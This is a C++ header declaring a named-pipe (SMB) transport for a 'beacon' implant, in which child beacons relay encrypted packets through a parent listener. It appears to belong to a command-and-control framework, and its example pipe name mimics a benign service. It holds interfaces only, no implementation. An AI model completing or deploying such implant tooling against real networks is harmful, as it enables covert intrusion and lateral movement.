/*
 * pipe_transport.h: Named pipe transport for SMB relay beacon
 *
 * Two modes:
 *   CLIENT (child beacon): connects to \\.\pipe\<name> via CreateFileW
 *   LISTENER (parent beacon): creates pipe via CreateNamedPipeW, accepts children
 *
 * Wire format matches TCP: [4-byte BE length][encrypted packet bytes]
 *
 * Zero malloc: uses caller-provided static buffers.
 */

#pragma once
#include <windows.h>
#include <cstdint>
#include <utility>
#include "../../include/resolver.h"

/* Max named pipe path: \\.\pipe\ + 256 chars */
#define MAX_PIPE_PATH 270
/* Max pipe name (just the part after \\.\pipe\) */
#define MAX_PIPE_NAME 256
/* Max read/write buffer: 64KB (covers most beacon packets) */
#define MAX_PIPE_BUFFER (64 * 1024)

/* ============================================================================
 * Client mode (child beacon connecting to parent)
 * ============================================================================ */

/*
 * pipeSocketRequest: Connect to named pipe, send request, receive response.
 * Signature matches TransportRequestFn so it can be swapped with winhttpRequest/tcpSocketRequest.
 *
 * For pipe transport:
 *   - host: pipe name (e.g., "msagent_XYZ"; the part after \\.\pipe\)
 *   - dest, userAgent: ignored
 *   - port: ignored
 *   - bodyData/bodyLen: encrypted beacon packet to send
 *
 * Returns: {malloc'd buffer, length}; caller must __free() the buffer.
 *          {nullptr, 0} on failure.
 */
std::pair<void*, size_t> pipeSocketRequest(
    functionTable* funcTable,
    const wchar_t*   host,         // pipe name (without \\.\pipe\ prefix)
    const wchar_t*   dest,         // ignored
    const wchar_t*   userAgent,    // ignored
    uint16_t         port,         // ignored
    const void*      bodyData,
    size_t           bodyLen
);

/*
 * pipeConnect: Low-level connect to a named pipe.
 * Returns pipe handle on success, INVALID_HANDLE_VALUE on failure.
 * Caller must CloseHandle() when done.
 */
HANDLE pipeConnect(functionTable* funcTable, const wchar_t* pipeName);

/*
 * pipeSendFrame: Send a length-prefixed frame over a pipe handle.
 * Returns true on success.
 */
bool pipeSendFrame(functionTable* funcTable, HANDLE hPipe,
                   const void* data, size_t dataLen);

/*
 * pipeRecvFrame: Receive a length-prefixed frame from a pipe handle.
 * Returns {malloc'd buffer, length}. Caller must __free().
 * {nullptr, 0} on failure or pipe closed.
 */
std::pair<void*, size_t> pipeRecvFrame(functionTable* funcTable, HANDLE hPipe);

/* ============================================================================
 * Listener mode (parent beacon accepting children)
 * ============================================================================ */

/*
 * pipeCreateListener: Create a named pipe and wait for a child to connect.
 * Returns pipe handle on success, INVALID_HANDLE_VALUE on failure.
 * The handle is connected and ready for ReadFile/WriteFile.
 */
HANDLE pipeCreateListener(functionTable* funcTable, const wchar_t* pipeName);

/*
 * pipeDisconnect: Disconnect a pipe handle (for reuse with next child).
 * Returns true on success.
 */
bool pipeDisconnect(functionTable* funcTable, HANDLE hPipe);
